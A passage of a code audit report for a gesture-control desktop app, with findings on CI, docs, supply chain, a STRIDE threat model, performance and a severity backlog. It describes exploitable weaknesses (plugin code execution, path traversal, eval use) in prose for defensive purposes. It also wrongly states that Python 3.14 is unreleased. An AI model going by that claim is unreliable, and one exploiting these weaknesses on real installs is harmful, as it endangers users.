**\[P2] Schema for FSM `condition` strings is just `"type": "string"`.** `gesture\\\\\\\_schema.json:29`. This is the AST-parsed condition expression — the entire security surface of the app. The schema does not constrain the grammar at all.
**\[P2] `\\\\\\\_load\\\\\\\_gestures` does not validate transitions reference existing states.** A `to: NonExistent` is silently handled at runtime by `self.reset()`.
**\[P2] `\\\\\\\_load\\\\\\\_gestures` does not validate that `initial\\\\\\\_state` exists.** If a gesture omits an "Idle" state, the first `evaluate()` logs "FSM in invalid state" and resets — forever.
**\[P2] `priority\\\\\\\_resolution: confidence` in `config:` section is not read by any code.** The resolver is hardcoded to sort by `(-confidence, priority)`.
**\[P3] Inconsistent `timeout\\\\\\\_ms` vs `max\\\\\\\_duration\\\\\\\_ms`** (both supported by `state\\\\\\\_machine.py:322`, but schema only mentions `max\\\\\\\_duration\\\\\\\_ms`).
**\[P3] YAML vs JSON inconsistency.** `default\\\\\\\_config.yaml` is YAML, `config\\\\\\\_schema.json` is JSON Schema. Acceptable but worth documenting.
**\[P3] `camera.resolution: \\\\\\\[640, 480]`** is hardcoded in config but `engine.py:69` hardcodes `640 \\\\\\\* 480 \\\\\\\* 3` for shm size independently. Two sources of truth.
\---
### 4.9 CI/CD
**\[P0] There is no `.github/` directory.** Glob `\\\\\\\*\\\\\\\*/.github/\\\\\\\*\\\\\\\*` returns zero results. No workflows, no issue templates, no PR template, no CODEOWNERS. `test\\\\\\\_strategy.md:253-325` and `master\\\\\\\_development\\\\\\\_plan.md:862-908` both contain complete, ready-to-paste GitHub Actions YAML. **Nobody pasted it.** The plan vs implementation gap on CI is total.
**\[P1] No pre-commit, no Dependabot.** No `.pre-commit-config.yaml`. No `.github/dependabot.yml`.
**\[P1] No SemVer enforcement, no release-please, no changelog automation.** `pyproject.toml:7`: `version = "0.1.0"` (hardcoded). `gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py:5`: `\\\\\\\_\\\\\\\_version\\\\\\\_\\\\\\\_ = "0.1.0"` (hardcoded, second source of truth). No `setuptools\\\\\\\_scm`, no `hatch-vcs`, no `release-please`. The two version strings will drift.
**\[P1] No SBOM, no SLSA, no provenance.** No `cyclonedx`/`spdx` SBOM generation. No SLSA build provenance. No `pip-audit`/`safety`/`bandit`/`semgrep` step anywhere — not even as a documented manual command.
A complete proposed CI matrix is given in [§9 CI/CD Design](#9-cicd-design).
\---
### 4.10 Documentation
**Files:** `README.md`, `gesture\\\\\\\_controller/docs/README.md`, `gesture\\\\\\\_controller/adr/README.md`, `plan.md`, `implementation\\\\\\\_plan.md`, `implementation\\\\\\\_guide.md`, `master\\\\\\\_development\\\\\\\_plan.md`, `agent\\\\\\\_prompts/\\\\\\\*.md`, `sys\\\\\\\_prompt\\\\\\\_\\\\\\\*.txt`, `docs/adr/adr-00{1,2,3,4}-\\\\\\\*.md`.
#### 4.10.1 README.md
**\[P0] README opens with `!!!UNTESTED!!!`** on line 1 and then claims "production-grade" on line 3. Line 50 says "tested on Python 3.14.2 on Windows, macOS, and Linux" — **Python 3.14 has not been released**. This is either a typo for 3.12 or a fabricated test claim. Line 50 also says "Maestro requires Python 3.10+" — conflicts with `pyproject.toml:10` `requires-python = ">=3.11"`.
Other README issues:
* Line 56: GitHub URL is correct, but every internal doc link in `implementation\\\\\\\_plan.md`, `implementation\\\\\\\_guide.md`, and `master\\\\\\\_development\\\\\\\_plan.md` points to `file:///c:/Users/Aryan/OneDrive/Desktop/Coding%20Projects/2-Hand%20Gesture%20Control/...` — Windows local filesystem links, useless in a published repo. Every `\\\\\\\[NEW] \\\\\\\[file.py](file:///c:/...)` link is broken.
* Lines 60–70: install instructions require `pip install -r requirements.txt` + `pip install -r requirements-dev.txt` + a manual `python -c "urllib.request.urlretrieve(...)"` to fetch `hand\\\\\\\_landmarker.task`. Three steps that should be one.
* No "Quick Start" section.
* No troubleshooting section.
* No screenshots/GIFs.
* No table of OS compatibility.
* No security/privacy section.
* License section contradicts the LICENSE file.
#### 4.10.2 Other docs
**\[P1] `gesture\\\\\\\_controller/docs/README.md` promises 3 docs that don't exist** — `architecture.md`, `performance.md`, `gesture-reference.md`. The directory has only the README.
**\[P1] `gesture\\\\\\\_controller/adr/README.md` is a 3-line stub.** Zero ADRs in this directory. The actual 4 ADRs live in `/docs/adr/`. The directory structure is split between two locations, neither documented. `master\\\\\\\_development\\\\\\\_plan.md:1025-1085` promises **10 ADRs**. **6 are missing**: ADR-005 (pyautogui with SendInput Upgrade Path), ADR-006 (In-Process EventBus over IPC), ADR-007 (/dev/uinput for Linux Wayland), ADR-008 (DTW for Custom Gestures), ADR-009 (Privacy by Design), ADR-010 (Plugin System with Hot Reload).
**\[P1] No CONTRIBUTING.md, no SECURITY.md, no CODE\_OF\_CONDUCT.md, no CHANGELOG.md, no CODEOWNERS, no PR template.** Standard open-source hygiene files, all absent. A project that injects kernel-level input events and asks for Accessibility permissions on macOS, /dev/uinput access on Linux, and SendInput on Windows — without a security disclosure policy — is irresponsible.
**\[P2] Three layers of planning documents, all out of sync.**
|File|Lines|Purpose|
|-|-|-|
|`plan.md`|750|Original spec|
|`implementation\\\\\\\_plan.md`|1259|Embeds a verbatim copy of `master\\\\\\\_development\\\\\\\_plan.md` at line 151|
|`implementation\\\\\\\_guide.md`|220|Partial re-spec|
|`master\\\\\\\_development\\\\\\\_plan.md`|1108|Synthesized from the above + 3 sys\_prompts|
|`sys\\\\\\\_prompt\\\\\\\_1.txt`|1117|6-thread model (later overridden)|
|`sys\\\\\\\_prompt\\\\\\\_2.txt`|57|3-thread model (later overridden)|
|`sys\\\\\\\_prompt\\\\\\\_3.txt`|\~1200|Yet another re-spec|
`implementation\\\\\\\_plan.md:151` literally says "## Master Development Plan (Verbatim)" and then re-pastes the master plan. **The repo has \~5,000 lines of planning markdown and zero lines of CI config.**
**\[P3] `master\\\\\\\_development\\\\\\\_plan.md` is future-dated.** Line 3: `\\\\\\\*\\\\\\\*Version:\\\\\\\*\\\\\\\* 1.0 | \\\\\\\*\\\\\\\*Date:\\\\\\\*\\\\\\\* 2026-06-29 | \\\\\\\*\\\\\\\*Status:\\\\\\\*\\\\\\\* Authoritative Development Guide`. Undermines the "Authoritative" claim.
**\[P3] ADR quality is shallow.** ADRs are ≤22 lines each. `adr-002-pyqt6.md` claims "Reduces compiled application size to under 80MB" and "idle memory under 40MB" — unsubstantiated performance claims with no measurement citation. No alternatives considered. No mention of the threading model that caused the P0 Qt threading violations.
\---
### 4.11 Supply Chain \& SBOM
**\[P0] No pinned hashes.** `requirements.txt` and `pyproject.toml` use only `>=`. No `--hash=sha256:...` lines anywhere. No `pip install --require-hashes` enforcement. A compromised PyPI mirror or a maintainer-account takeover of `mediapipe` or `PyQt6` would silently install malware on every user.
**\[P1] No SBOM generation.** No `cyclonedx-py` or `spdx-tools` config. No `pip-licenses` to verify license compatibility (AGPL-3.0 + PyQt6 = GPL/Commercial dual — fine, but undocumented).
**\[P1] No vulnerability scanning.** No `pip-audit`, `safety`, `bandit`, or `semgrep` in any config or script. The AST condition parser is a hand-written security boundary with zero fuzzing, zero `bandit` coverage, and zero `semgrep` rules.
**\[P2] `pyautogui` as the default Windows input backend is a known-security-and-latency problem.** `pyautogui` depends on `pygetwindow`/`pymsgbox`/`mouseinfo` — a transitive supply chain of unmaintained single-author packages. The plan promises a SendInput upgrade path; the default should be SendInput from day one.
**\[P2] `hand\\\\\\\_landmarker.task` is committed to git silently.** \~10 MB MediaPipe model file. No LFS, no SHA256 verification at runtime, no version pin. If a user re-downloads the model from the MediaPipe docs URL, behavior changes silently.
\---
## 5\. Cross-Cutting Concerns
### 5.1 Security Threat Model (STRIDE)
|Threat|Surface|Vector|Current mitigation|Severity|Recommended mitigation|
|-|-|-|-|-|-|
|**S**poofing|Plugin identity|A malicious plugin in `\\\\\\\~/.config/gesture\\\\\\\_controller/plugins/` claims to be a known plugin name|None — name collision silently overrides (or is overridden by) builtins|P0|Sign plugins; refuse to load unsigned plugins in `\\\\\\\~/.config`; refuse to override builtins by name|
|**T**ampering|Config file|Attacker with write access to `\\\\\\\~/.config/gesture\\\\\\\_controller/config.yaml` injects malicious gesture definitions|None — no checksum, no signature|P1|Sign config on write; verify on load; warn on unsigned user config|
|**T**ampering|Plugin code|Plugin module-level code runs before `PLUGIN\\\\\\\_META` validation|None — see §4.4.1 P0|P0|AST-parse `PLUGIN\\\\\\\_META` before `exec\\\\\\\_module`; full sandbox via `RestrictedPython` or subprocess with seccomp|
|**T**ampering|Model file|`hand\\\\\\\_landmarker.task` is loaded with no integrity check|None — `exists()` only|P2|Pin SHA256; verify on load; refuse to start if hash mismatch|
|**T**ampering|SharedMemory|Any process owned by same user can `mmap` `/dev/shm/psm\\\\\\\_\\\\\\\*` and read raw webcam frames|None — default perms 0644|P2|`chmod 600` after `SharedMemory.create()`|
|**R**epudiation|OS input injection|A compromised Maestro process can inject keystrokes into password fields, Keychain prompts, Screen Lock|None — no audit log|P1|Log every injected key/mouse event with timestamp + gesture source + dispatch latency; rotate logs|
|**I**nformation disclosure|Camera frames|Raw webcam frames in `/dev/shm` are world-readable|None|P2|`chmod 600`; consider `memfd\\\\\\\_create` with seal instead of `SharedMemory`|
|**I**nformation disclosure|Plugin memory|Any plugin can read the full `GestureEvent` including `app\\\\\\\_profile` (foreground process name)|None — no authorization on event bus|P2|Add `event\\\\\\\_bus.subscribe(event\\\\\\\_type, handler, required\\\\\\\_permissions=\\\\\\\[...])`|
|**D**enial of service|AST condition parser|A 10 MB condition string consumes CPU/memory during parsing|None — no size limit|P2|Cap expression size at 4 KB; cap AST node count at 100; reject early|
|**D**enial of service|Engine main loop|A persistent exception in `extract()` spins the loop at 1000 Hz, filling disk with logs|None — no circuit breaker|P1|Exponential backoff; consecutive-error shutdown threshold|
|**D**enial of service|Plugin crash|A plugin that raises on every event logs 60 stack traces/sec|None — no circuit breaker|P1|Per-handler failure counter; auto-unsubscribe after N consecutive failures|
|**E**levation of privilege|udev rule|`GROUP="input"` grants every member of `input` write access to `/dev/uinput`|None — broad group|P0|Dedicated `gesture-controller` group; per-user ACL via `setfacl`|
|**E**levation of privilege|Path traversal|`name` from `QLineEdit` is used directly in `dest\\\\\\\_dir / f"{name}.json"`|None|P0|Regex-sanitize name; verify resolved path is inside `dest\\\\\\\_dir`|
|**E**levation of privilege|AST `eval()`|`SafeExpressionEvaluator.evaluate` calls `eval()` despite ADR-004|AST allow-list (probably safe today)|P1|Delete `eval()`; migrate `compile\\\\\\\_condition` to use the same evaluator|
|**E**levation of privilege|macOS Accessibility|Once granted, Maestro can inject input anywhere, including password fields|None — no audit log|P1|Log every CGEventPost; document in SECURITY.md|
**Top 5 security risks (priority order):**
1. **Plugin code execution before manifest validation** (P0) — anyone with write access to `\\\\\\\~/.config/gesture\\\\\\\_controller/plugins/` gets full user privileges on every launch.
2. **Path traversal in custom gesture save** (P0) — user-supplied name can write to arbitrary user-writable locations.
3. **`eval()` in `SafeExpressionEvaluator`** (P1) — contradicts ADR-004, expands attack surface.
4. **uinput group is `input`** (P0) — every binary the user runs can synthesize arbitrary input.
5. **No config signing / checksum** (P1) — attacker with write access to `\\\\\\\~/.config/gesture\\\\\\\_controller/config.yaml` can inject arbitrary gesture definitions whose conditions are AST-evaluated.
### 5.2 Performance Analysis
The architecture spec targets:
* Camera capture: <5 ms
* MediaPipe inference: <10 ms
* Feature engineering: <1 ms
* FSM evaluation: <0.5 ms
* Action dispatch: <5 ms
* **End-to-end: <30 ms (33 FPS)**
Current measured-against-target (static analysis, no hardware):
|Stage|Target|Current|Gap|Root cause|
|-|-|-|-|-|
|Camera capture|<5 ms|\~3 ms|✓|OK (but 3 allocs/frame)|
|MediaPipe inference|<10 ms|50–80 ms|**5–8× over**|IMAGE mode instead of VIDEO mode (P0)|
|One-Euro filter|<0.5 ms|\~0.3 ms|✓|OK (but 7 `.copy()` calls)|
|Feature engineering|<1 ms|\~1.5 ms|1.5× over|Python loop for finger curls|
|FSM evaluation|<0.5 ms|\~2 ms|4× over|Recursive `\\\\\\\_resolve`, no precompiled lambda|
|Action dispatch (Windows)|<5 ms|60+ ms|**12× over**|`pyautogui.PAUSE = 0.01` × 6 calls|
|Action dispatch (macOS)|<5 ms|50–100 ms|**10–20× over**|`AXUIElementCopyAttributeValue` synchronous|
|Action dispatch (Linux)|<5 ms|10–50 ms|2–10× over|`swaymsg` subprocess per gesture|
|Engine polling overhead|0|33% CPU waste|—|1 ms busy poll, 33× per frame|
|**End-to-end (Windows)**|<30 ms|**130–250 ms**|**4–8× over**|pyautogui latency dominates|
|**End-to-end (macOS)**|<30 ms|**120–200 ms**|**4–7× over**|Accessibility AX calls dominate|
|**End-to-end (Linux)**|<30 ms|**80–150 ms**|**3–5× over**|Foreground-app subprocess dominates|
**Conclusion:** The performance target is missed by 3–8× on every platform. The biggest wins, in order:
1. Switch MediaPipe to VIDEO mode (saves 35–70 ms/frame).
2. Implement SendInput path on Windows, retire pyautogui (saves 50+ ms/dispatch).
3. Cache `get\\\\\\\_foreground\\\\\\\_app()` for 500 ms (saves 10–50 ms/dispatch on Linux).
4. Replace 1 ms busy-poll with `multiprocessing.Event` (saves 33% CPU).
5. Precompile FSM conditions to lambdas (saves \~1.5 ms/frame).
### 5.3 Cross-Platform Parity Matrix
See [§4.3.3](#433-cross-platform-parity) for the per-action matrix. Summary:
|Platform|# actions fully working|# actions broken|# actions partial|Readiness|
|-|-|-|-|-|
|Linux/Wayland (uinput)|4|3|8|30%|
|Linux/X11 (xdotool)|3|4|8|20%|
|macOS (Quartz)|2|5|8|15%|
|Windows (pyautogui)|5|2|8|40%|
**The default profile action `KeyPress:ArrowLeft` is broken on every platform.** This is the out-of-the-box experience.
### 5.4 Observability Gaps
The codebase has **no metrics, no tracing, no structured event log, no diagnostic dump, no crash reporter**. Specifically:
* **No FPS counter exposed to logs** (only to tooltip).
* **No gesture recognition rate** (gestures detected / minute).
* **No action dispatch latency histogram.**
* **No FSM transition log** (which FSM fired, which state it transitioned to, which condition matched).
* **No DTW distance log** (how close non-matching gestures were).
* **No plugin load time metric.**
* **No camera reconnect counter.**
* **No `camera\\\\\\\_disconnected` event published** (the EventBus type exists but is never fired).
* **No `plugin\\\\\\\_reloaded` event subscriber** in the engine (the event is published but nothing re-binds action handlers).
* **No "Export Diagnostics" tray action** that would dump: loaded plugins, gesture definitions, action mappings, controller type, foreground app, config snapshot, recent log tail. For a production support issue, this makes remote debugging nearly impossible.
* **No correlation IDs** linking `raw\\\\\\\_landmarks` → `gesture\\\\\\\_triggered` → dispatcher → OS call.
* **`logger.error(...)` loses tracebacks** (should be `logger.exception(...)`).
\---
## 6\. Severity Matrix (P0–P4)
Every issue found in this audit, ranked by severity. Use this as your sprint backlog.
### 6.1 P0 — Blockers (must fix before any user-facing release)
|#|Layer|Issue|File:line|Effort|Impact|
|-|-|-|-|-|-|
|P0-1|Core|Windows import `NameError` (uses `Any` before import)|`gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py:12-21`|S|App cannot start on Windows|
|P0-2|Vision|MediaPipe IMAGE mode instead of VIDEO mode|`vision/landmark\\\\\\\_extractor.py:34,65`|M|3–5× slower inference, no tracking, `min\\\\\\\_tracking\\\\\\\_confidence` no-op|
|P0-3|Vision|One-Euro filter params 250× too small (`min\\\\\\\_cutoff=0.004`)|`vision/one\\\\\\\_euro\\\\\\\_filter.py:13-14`|S|Filtered landmarks lag by \~1s; no gesture works|
|P0-4|ML|DTW match fires every frame (no cooldown)|`models/dtw\\\\\\\_matcher.py:233-262`|M|Single gesture triggers OS action 60+ times|
|P0-5|ML|No hand-ID tracking across pipeline|`vision/landmark\\\\\\\_extractor.py` + `core/engine.py`|L|Hand swaps corrupt filter, DTW buffer, FSM state|
|P0-6|Core|`OneEuroFilter` shared across all hands|`core/engine.py:82,207-217`|S|Two-hand gestures get cross-contaminated smoothing|
|P0-7|Core|`FeatureVector` mutated across FSMs|`core/state\\\\\\\_machine.py:197-201`|S|Delta fields are garbage for every FSM after the first|
|P0-8|Core|Plugin hot-reload races engine loop|`core/engine.py:143`, `core/state\\\\\\\_machine.py:360`|M|Reload mid-iteration → empty/half-populated FSM list|
|P0-9|Core|Chained-comparison semantics wrong in `compile\\\\\\\_condition`|`core/state\\\\\\\_machine.py:41-49`|S|`0 < 5 < 2` evaluates to `True`|
|P0-10|Core|`GestureEngine.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` no rollback on failure|`core/engine.py:28-94`|M|Camera subprocess orphaned, shm leaks on init failure|
|P0-11|OS|Cross-platform key-name vocabulary broken|`os\\\\\\\_integration/action\\\\\\\_dispatcher.py:101-103` + all controllers|M|`KeyPress:ArrowLeft` silently fails Linux/macOS, crashes Windows|
|P0-12|OS|macOS `cmd+m` minimize fallback sends `cmd+a`|`os\\\\\\\_integration/macos\\\\\\\_controller.py:234,28-35`|S|Fresh-install macOS gesture selects all text instead of minimizing|
|P0-13|OS|Linux X11 minimize broken (`$(...)` not expanded)|`os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py:319-320`|S|Minimize on X11 is a no-op|
|P0-14|OS|Linux GNOME/KDE minimize triggers Show Desktop|`os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py:310-323`|S|Minimize on GNOME/KDE shows desktop instead|
|P0-15|OS|`\\\\\\\_create\\\\\\\_uinput\\\\\\\_device` struct pack malformed|`os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py:94`|S|uinput device created with corrupted id fields|
|P0-16|OS|`pyautogui.FAILSAFE = True` crashes dispatcher|`os\\\\\\\_integration/windows\\\\\\\_controller.py:12`|S|Gesture moving mouse to (0,0) crashes engine thread|
|P0-17|Plugin|Plugin code executes before manifest validation|`plugins/plugin\\\\\\\_loader.py:104-127`|M|Malicious plugin runs with full user privileges on startup|
|P0-18|GUI|Qt threading violations throughout|`gui/app\\\\\\\_entry.py:58,92-95`, `gui/tray\\\\\\\_icon.py:54-55,115-133`|L|Intermittent segfaults, corrupted repaints|
|P0-19|GUI|Custom gesture recording broken (`landmark\\\\\\\_callback=None`)|`gui/app\\\\\\\_entry.py:46`, `gui/settings\\\\\\\_window.py:91,347-351`|S|Recorder captures zero frames; feature completely broken|
|P0-20|GUI|Path traversal in custom gesture save|`gui/settings\\\\\\\_window.py:353-369`|S|User-supplied name writes to arbitrary locations|
|P0-21|GUI|`\\\\\\\_poll\\\\\\\_engine` reads engine state without lock|`gui/app\\\\\\\_entry.py:79-83`|M|Data race on `self.\\\\\\\_current\\\\\\\_hands`|
|P0-22|Packaging|License metadata mismatch (MIT vs AGPL-3.0)|`pyproject.toml:11` vs `LICENSE`|S|Legal/supply-chain defect; downstream consumers in AGPL violation|
|P0-23|Packaging|Platform-specific deps undeclared|`pyproject.toml:12-24`|S|`pip install` succeeds but app crashes on first run|
|P0-24|Packaging|No installer artefacts|`packaging/`|L|Non-technical users cannot install|
|P0-25|CI/CD|No `.github/workflows/` exists|repo root|M|No CI; no automated tests run on push|
|P0-26|Supply chain|No pinned hashes|`requirements.txt`, `pyproject.toml`|M|Compromised PyPI mirror → malware on every user|
|P0-27|Security|udev rule grants broad `input` group write access|`packaging/99-gesture-controller-uinput.rules`|S|Every binary user runs can synthesize input|
|P0-28|Docs|README claims `!!!UNTESTED!!!` and "production-grade" simultaneously|`README.md:1,3`|S|Misleading; claims "Python 3.14.2" testing (unreleased)|
**Total P0: 28 issues.**
### 6.2 P1 — Critical (should not ship to end users)
|#|Layer|Issue|File:line|Effort|
|-|-|-|-|-|
|P1-1|Core|Exception swallowing in main loop creates hot spin|`core/engine.py:266-269`|S|
|P1-2|Core|`set\\\\\\\_paused()` not thread-safe, doesn't propagate|`core/engine.py`|S|
|P1-3|Core|`shutdown()` 2s join can be exceeded by OS calls|`core/engine.py`|M|
|P1-4|Core|No SIGINT/SIGTERM handlers → shm leak|`core/engine.py`|S|
|P1-5|Core|`\\\\\\\_resolve` defeats short-circuit eval|`core/state\\\\\\\_machine.py:101`|S|
|P1-6|Core|`compile\\\\\\\_condition` no `SyntaxError` handling|`core/state\\\\\\\_machine.py:28`|S|
|P1-7|Core|Hardcoded state names `"ScrollingActive"`, `"Trigger"`|`core/state\\\\\\\_machine.py:249,251,363`|M|
|P1-8|Core|Hardcoded scroll multiplier `30.0` + `"delta"` substring|`core/state\\\\\\\_machine.py:255-259`|S|
|P1-9|Core|`SafeExpressionEvaluator.evaluate` uses `eval()`|`core/config\\\\\\\_manager.py:74`|M|
|P1-10|Core|`USER\\\\\\\_CONFIG\\\\\\\_DIRS\\\\\\\["Windows"]` relative path when `APPDATA` unset|`core/config\\\\\\\_manager.py:17`|S|
|P1-11|Core|Schema validation crashes app on user typo|`core/config\\\\\\\_manager.py:137-142`|M|
|P1-12|Core|`Hand.\\\\\\\_\\\\\\\_post\\\\\\\_init\\\\\\\_\\\\\\\_` uses `assert`|`models/data\\\\\\\_types.py:23`|S|
|P1-13|Core|`Hand` `frozen=True` but `palm\\\\\\\_center` mutable|`models/data\\\\\\\_types.py`|S|
|P1-14|Core|Engine reaches into `ConfigManager.\\\\\\\_config` private dict|`core/engine.py:65,75,79,94,160`|M|
|P1-15|Core|`compile\\\\\\\_condition` allows `abs(...)` by name|`core/state\\\\\\\_machine.py:62-68`|M|
|P1-16|Vision|No NaN/Inf handling in One-Euro filter|`vision/one\\\\\\\_euro\\\\\\\_filter.py`|S|
|P1-17|Vision|Depth adaptation math inverted|`vision/one\\\\\\\_euro\\\\\\\_filter.py:58-61`|S|
|P1-18|Vision|`cap.set()` return value never checked|`vision/camera\\\\\\\_stream.py:61-63`|S|
|P1-19|Vision|`min\\\\\\\_hand\\\\\\\_presence\\\\\\\_confidence` mapped to wrong option|`vision/landmark\\\\\\\_extractor.py:37`|S|
|P1-20|Vision|`visibility` always 0.0 (dead code)|`vision/landmark\\\\\\\_extractor.py:83`|S|
|P1-21|Vision|`handedness\\\\\\\[0].category\\\\\\\_name` IndexError on empty list|`vision/landmark\\\\\\\_extractor.py:89`|S|
|P1-22|Vision|No SHA256 verification on model file|`vision/landmark\\\\\\\_extractor.py:18,27`|S|
|P1-23|Vision|`create\\\\\\\_from\\\\\\\_options` propagates startup crash|`vision/landmark\\\\\\\_extractor.py:39`|M|
|P1-24|OS|`key\\\\\\\_press` only emits key-down on Linux/macOS|`linux\\\\\\\_wayland\\\\\\\_controller.py:130-146`, `macos\\\\\\\_controller.py:62-70`|S|
|P1-25|OS|No Accessibility permission check on macOS|`macos\\\\\\\_controller.py:40-41,206-234`|M|
|P1-26|OS|`\\\\\\\_emit\\\\\\\_event` can raise `BlockingIOError`|`linux\\\\\\\_wayland\\\\\\\_controller.py:104-112`|S|
|P1-27|OS|`\\\\\\\_create\\\\\\\_uinput\\\\\\\_device` leaks fd on partial failure|`linux\\\\\\\_wayland\\\\\\\_controller.py:63-102`|S|
|P1-28|OS|`LINUX\\\\\\\_KEYCODES` missing most keys|`linux\\\\\\\_wayland\\\\\\\_controller.py:24-33`|S|
|P1-29|OS|`mouse\\\\\\\_move` absolute is silent no-op on uinput|`linux\\\\\\\_wayland\\\\\\\_controller.py:227-239`|M|
|P1-30|OS|Middle mouse button sends right-click on Linux|`linux\\\\\\\_wayland\\\\\\\_controller.py:200`|S|
|P1-31|OS|`mouse\\\\\\\_double\\\\\\\_click` no `SYN\\\\\\\_REPORT` between clicks|`linux\\\\\\\_wayland\\\\\\\_controller.py:210-219`|S|
|P1-32|OS|Volume step inconsistency (1× vs 3×)|`windows\\\\\\\_controller.py:103-104` vs `linux\\\\\\\_wayland\\\\\\\_controller.py:355`|S|
|P1-33|OS|`get\\\\\\\_foreground\\\\\\\_app` synchronous per-gesture|`os\\\\\\\_integration/action\\\\\\\_dispatcher.py:52`|M|
|P1-34|OS|`get\\\\\\\_foreground\\\\\\\_app` on macOS returns localized name|`macos\\\\\\\_controller.py:198-204`|S|
|P1-35|OS|`show\\\\\\\_desktop` on macOS sends F11 (Mission Control)|`macos\\\\\\\_controller.py:242`|S|
|P1-36|OS|`windows\\\\\\\_controller.py` exception handler over-broad|`windows\\\\\\\_controller.py:79`|S|
|P1-37|OS|`mouse\\\\\\\_double\\\\\\\_click` TypeError on None coords|`windows\\\\\\\_controller.py:46`|S|
|P1-38|OS|`pyautogui.PAUSE = 0.01` adds 60ms per combo|`windows\\\\\\\_controller.py:13`|S|
|P1-39|Plugin|`sys.modules\\\\\\\[module\\\\\\\_name] = module` before `exec\\\\\\\_module`|`plugins/plugin\\\\\\\_loader.py:112`|S|
|P1-40|Plugin|Plugin name collision across directories|`plugins/plugin\\\\\\\_loader.py:92-95`|S|
|P1-41|Plugin|Filename collision in `sys.modules`|`plugins/plugin\\\\\\\_loader.py:106`|S|
|P1-42|Plugin|Hot-reload stale references|`plugins/plugin\\\\\\\_loader.py:157-171`|M|
|P1-43|Plugin|Hot-reload dedup logic wrong on name change|`plugins/plugin\\\\\\\_loader.py:164-167`|S|
|P1-44|GUI|`signal.signal(SIGINT)` doesn't work with Qt|`gui/app\\\\\\\_entry.py:132`|S|
|P1-45|GUI|`\\\\\\\_shutdown` doesn't stop watchdog Observer|`gui/app\\\\\\\_entry.py:117-125`|S|
|P1-46|GUI|`\\\\\\\_on\\\\\\\_config\\\\\\\_changed` mutates overlay internals|`gui/app\\\\\\\_entry.py:101`|S|
|P1-47|GUI|No `isSystemTrayAvailable()` check|`gui/tray\\\\\\\_icon.py:82`|S|
|P1-48|GUI|Tray icon hardcoded 32×32 (blurry on HiDPI)|`gui/tray\\\\\\\_icon.py:10`|S|
|P1-49|GUI|`\\\\\\\_on\\\\\\\_apply` destroys config comments|`gui/settings\\\\\\\_window.py:394`|M|
|P1-50|GUI|`HotkeyCaptureWidget` loses Shift+digit distinction|`gui/settings\\\\\\\_window.py:77`|S|
|P1-51|GUI|Hardcoded dark theme|`gui/settings\\\\\\\_window.py:101-148`|M|
|P1-52|GUI|`reposition()` only called in `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_`|`gui/overlay.py:31`|S|
|P1-53|GUI|Hardcoded "Segoe UI" font (Windows-only)|`gui/overlay.py:132`|S|
|P1-54|Testing|`tests/replay/` and `tests/benchmarks/` empty|`tests/replay/`, `tests/benchmarks/`|L|
|P1-55|Testing|No property-based tests despite `hypothesis` dep|`tests/`|M|
|P1-56|Testing|`windows\\\\\\\_controller.py` and `action\\\\\\\_mapper.py` untested|`tests/unit/`|M|
|P1-57|Testing|No SECURITY.md, CONTRIBUTING.md, etc.|repo root|M|
|P1-58|Testing|Only 4 of 10 promised ADRs exist|`docs/adr/`|M|
|P1-59|Config|`config\\\\\\\_schema.json` no `required`, no `additionalProperties:false`|`data/config\\\\\\\_schema.json`|M|
|P1-60|Config|`predefined\\\\\\\_gestures.yaml` not fully schema-validated|`data/gesture\\\\\\\_schema.json`|M|
|P1-61|Config|No config migration strategy|`core/config\\\\\\\_manager.py`|L|
|P1-62|Config|`safety.safety\\\\\\\_gesture\\\\\\\_enabled: false` default|`data/default\\\\\\\_config.yaml`|S|
|P1-63|Config|`os\\\\\\\_integration.windows.use\\\\\\\_sendinput: false` default|`data/default\\\\\\\_config.yaml`|S|
|P1-64|Packaging|No code signing / notarization|`gesture\\\\\\\_controller.spec:51`|L|
|P1-65|Packaging|PyInstaller spec broken (no Info.plist, no BUNDLE, deprecated kwargs)|`gesture\\\\\\\_controller.spec`|M|
|P1-66|Packaging|No systemd service file|`packaging/`|S|
|P1-67|Packaging|No first-run permission wizard|`gui/`|L|
|P1-68|Packaging|`verify\\\\\\\_install.py` unreachable after `pip install`|`scripts/verify\\\\\\\_install.py`|S|
|P1-69|CI/CD|No pre-commit, no Dependabot|repo root|S|
|P1-70|CI/CD|No SemVer, no release-please, no changelog|`pyproject.toml`, `gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`|M|
|P1-71|CI/CD|No SBOM, no SLSA, no provenance|repo root|M|
|P1-72|Supply chain|No SBOM generation|`pyproject.toml`|M|
|P1-73|Supply chain|No vulnerability scanning|`pyproject.toml`|S|
|P1-74|Docs|`gesture\\\\\\\_controller/docs/README.md` promises 3 missing docs|`gesture\\\\\\\_controller/docs/`|M|
|P1-75|Docs|`gesture\\\\\\\_controller/adr/` empty stub|`gesture\\\\\\\_controller/adr/`|S|
|P1-76|Performance|1ms busy-poll (no frame-available signaling)|`core/engine.py:268-269`|M|
|P1-77|Performance|`EventBus.publish` synchronous, blocks engine|`core/event\\\\\\\_bus.py:33-42`|M|
|P1-78|Architecture|`GestureEngine.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` god-method|`core/engine.py:28-94`|M|
|P1-79|Architecture|Two AST evaluators with different security postures|`state\\\\\\\_machine.py`, `config\\\\\\\_manager.py`|M|
|P1-80|Observability|No metrics, no tracing, no correlation IDs|`core/`|L|
**Total P1: 80 issues.**
### 6.3 P2 — Major (ship-blocking for v1.0, not for v0.2 beta)
Total P2 issues: \~50 (camera fd leak, BGRA frame handling, dead EventBus queue, ActionMapper dead code, schema gaps, test quality bugs, etc.). See §4 for the full list per layer.
### 6.4 P3 — Minor
Total P3 issues: \~25 (duplicate `main.py`, dead `True`/`False` Name branch, hardcoded `super` (left only), etc.).
### 6.5 P4 — Polish
Total P4 issues: \~10 (empty `core/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py` docstring, README emoji inconsistency, etc.).
### 6.6 Severity roll-up
|Severity|Count|Examples|
|-|-|-|
|**P0 (blocker)**|28|Windows NameError, filter params, DTW action storm, key-name vocabulary, plugin sandboxing, Qt threading, license mismatch, no CI|
